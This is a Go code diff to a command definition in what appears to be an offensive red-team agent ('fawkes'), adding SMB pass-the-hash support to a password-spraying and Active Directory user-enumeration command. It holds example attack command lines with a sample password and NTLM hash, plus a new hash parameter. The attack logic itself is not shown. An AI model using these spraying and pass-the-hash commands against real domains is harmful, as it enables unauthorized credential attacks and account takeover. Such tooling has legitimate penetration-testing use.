@@ -11,8 +11,8 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "spray",
-		Description:         "Password spray or Kerberos user enumeration against AD. Spray via Kerberos pre-auth, LDAP bind, or SMB auth. Enumerate validates usernames without credentials.",
-		HelpString:          "spray -action kerberos -server 192.168.1.1 -domain CORP.LOCAL -users \"user1\\nuser2\\nuser3\" -password Summer2026!\nspray -action enumerate -server dc01 -domain corp.local -users \"admin\\njsmith\\nsvc_backup\"\nspray -action ldap -server dc01 -domain corp.local -users \"admin\\njsmith\" -password Password1 -delay 1000 -jitter 25",
+		Description:         "Password spray or Kerberos user enumeration against AD. Spray via Kerberos pre-auth, LDAP bind, or SMB auth. SMB supports pass-the-hash. Enumerate validates usernames without credentials.",
+		HelpString:          "spray -action kerberos -server 192.168.1.1 -domain CORP.LOCAL -users \"user1\\nuser2\\nuser3\" -password Summer2026!\nspray -action smb -server dc01 -domain corp.local -users \"admin\\njsmith\" -hash aad3b435b51404ee:8846f7eaee8fb117\nspray -action enumerate -server dc01 -domain corp.local -users \"admin\\njsmith\\nsvc_backup\"\nspray -action ldap -server dc01 -domain corp.local -users \"admin\\njsmith\" -password Password1 -delay 1000 -jitter 25",
 		Version:             2,
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1110.003", "T1589.002"},
@@ -73,7 +73,18 @@ func init() {
 				Name:             "password",
 				CLIName:          "password",
 				ModalDisplayName: "Password",
-				Description:      "Password to spray (not required for enumerate action)",
+				Description:      "Password to spray (not required for enumerate action, or use -hash for SMB PTH)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "hash",
+				CLIName:          "hash",
+				ModalDisplayName: "NTLM Hash",
+				Description:      "NT hash for SMB pass-the-hash spray (hex, e.g., aad3b435b51404ee:8846f7eaee8fb117 or just the NT hash)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
